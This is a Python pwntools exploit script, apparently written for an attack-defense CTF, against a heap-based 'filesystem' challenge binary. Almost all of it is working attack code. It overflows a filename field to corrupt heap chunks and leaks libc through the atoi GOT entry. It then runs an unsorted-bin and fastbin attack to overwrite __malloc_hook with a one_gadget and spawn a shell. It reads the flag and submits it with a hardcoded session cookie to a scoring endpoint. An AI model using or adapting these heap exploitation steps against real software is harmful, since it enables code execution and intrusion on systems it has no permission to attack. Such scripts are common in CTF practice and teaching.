from pwn import *
import sys
import requests
from requests import post

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./filesystem")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./filesystem")
else:
	p = remote(sys.argv[1],sys.argv[2],timeout = 2)
	libc = ELF("./libc.so.6")
	elf = ELF("./filesystem")

def menu(choice):
	p.sendafter("Your choice: \n",str(choice))

def add_dir(name):
	menu(1)
	p.sendlineafter("Give me the directory name: ",name)

def add_file(name_dir,size,name,new_name,content,change = True):
	menu(2)
	p.sendlineafter("which directory do you want to put this file in: \n",name_dir)
	p.sendlineafter("Ok, plz input your filename(len<=0x20): \n",name)
	p.sendafter("file size: \n",str(size))
	if change:
		p.sendlineafter("you want to change your filename?(Y/N)\nOtherwise,the name can not be changed!!\n","Y")
		p.sendafter("input your new file name: \n",new_name)
	else:
		p.sendlineafter("you want to change your filename?(Y/N)\nOtherwise,the name can not be changed!!\n","N")
	p.sendlineafter("Content: \n",content)

def show(dir_name,name):
	menu(3)
	p.sendlineafter("input directory: \n",dir_name)
	p.sendlineafter("input filename: \n",name)

def free(dir_name,name):
	menu(4)
	p.sendlineafter("input directory: \n",dir_name)
	p.sendlineafter("input filename: \n",name)

def recover(dir_name,name):
	menu(6)
	p.sendlineafter("input directory: \n",dir_name)
	p.sendlineafter("input filename: \n",name)

def debugf():
	if debug:
		gdb.attach(p,"b *0x00000000004017DE\nb *0x4011A5\nb *0x400E10")

cookie = "PHPSESSID=fnmto7o4paibjkhpn3icvp828v"
url = "http://172.16.123.123/commapi/userspace/submitFlag"
def submit(flag):
	print post(url, headers={"Cookie": cookie}, data={"flag" : flag}).text

#context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
#debugf()
add_dir("a")
add_file("a",0x10,"b","c","c",False)
free("a","b")
payload = "d" * 0x30 + "\xff"
target = p64(0) * 3 + p64(0x51) + "e\x00" + "\x00" * 6 + "\x00" * 0x28 + "\xff" + "\x00" * 7 + p64(0) + p64(elf.got["atoi"])
add_file("a",0x10,"b"*0x1f,payload,target)
show("a","e")
p.recvuntil("file content: ")
leak_addr = u64(p.recvuntil("\n",drop = True).ljust(8,"\x00"))
libc.address = leak_addr - libc.symbols["atoi"]
log.success("libc_base:" + hex(libc.address))
#debugf()
add_file("a",0x10,"1","c","c",False)
add_file("a",0x90,"2","2","f",False)
add_file("a",0x10,"d1","d1","c",False)
add_file("a",0x60,"d2","d2","c",False)
add_file("a",0x40,"3","2","f",False)
add_file("a",0x40,"4","2","f",False)
add_file("a",0x40,"5","2","f",False)
add_file("a",0x40,"6","2","f",False)
free("a","1")
free("a","2")
#debugf()
attack = 0x603060 + 8
payload = "d" * 0x30 + "\xff"
target = "\x00" * 0xb8 + p64(0xa1) + p64(0) + p64(attack - 0x10)
add_file("a",0x10,"b"*0x1f,payload,target)
free("a","3")
add_file("a",0x90,"2","2","f",False)
free("a","d1")
free("a","d2")
free("a","4")
free("a","5")
free("a","6")
debugf()
payload = "d" * 0x30 + "\xff"
target = "\x00" * 0x68 + p64(0x71) + p64(libc.symbols["__malloc_hook"] - 0x23)
add_file("a",0x10,"b"*0x1f,payload,target)
add_file("a",0x60,"e1","a","a",False)
payload = "aaa" + p64(0) * 2 + p64(libc.address + 0x4526a)
add_file("a",0x60,"e1","a",payload,False)
menu(2)
p.sendlineafter("which directory do you want to put this file in: \n","a")
p.sendline("cat flag")
flag = p.recvline().strip("\n")
submit(flag)
#recover("a","c")
p.close()
